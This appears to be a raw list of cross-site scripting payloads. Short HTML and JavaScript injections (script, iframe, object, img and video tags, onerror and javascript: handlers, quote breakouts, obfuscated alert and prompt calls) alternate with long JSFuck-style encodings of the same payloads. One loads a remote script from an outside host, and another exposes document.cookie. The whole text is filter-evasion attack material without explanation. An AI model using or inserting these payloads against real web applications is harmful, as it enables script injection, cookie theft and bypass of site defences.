[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+([false]+"")[10]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+(true+"")[1]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
(prompt)(165)
([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[12]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
a=prompt,a(167)
(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(false+"")[1]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
[1].find(prompt)
([false]+"")[13]+(+!+[]+[])[0]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[12]
top[“al”+”ert”](171)
(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(8220)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(8221)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(8221)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(8221)")()+([false]+"")[14]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]
top[/al/.source+/ert/.source](173)
(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+([false]+"")[14]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
al\u0065rt(175)
(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
top[‘al\145rt’](177)
(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(8216)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(8217)")()+([false]+"")[14]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
top[‘al\x65rt’](179)
(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(8216)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(8217)")()+([false]+"")[14]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]
top[8680439..toString(30)](181)
(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([false]+"")[13]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+([false]+"")[14]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]
prompt?.()
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[11]+([false]+"")[12]
(prompt())
([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+([false]+"")[12]+([false]+"")[12]
<Video> <source onerror = "javascript: prompt (XSS-187)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[10]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<Input value = "XSS-189" type = text>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+(undefined+"")[0]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<applet code="javascript:confirm(document.cookie);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[2]+(true+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+([false]+"")[10]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[11]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+([false]+"")[10]+(true+"")[3]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<isindex x="javascript:" onmouseover="prompt(193)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[3]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
"></SCRIPT>”>’><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(8221)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(8217)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
"><img src="x:x" onerror="prompt(197)">
[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
"><iframe src="javascript:prompt(199)">
[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript:prompt(201)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<isindex type=image src=1 onerror=prompt(203)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[3]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+[])[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x:prompt(alt) onerror=eval(src) alt=0>
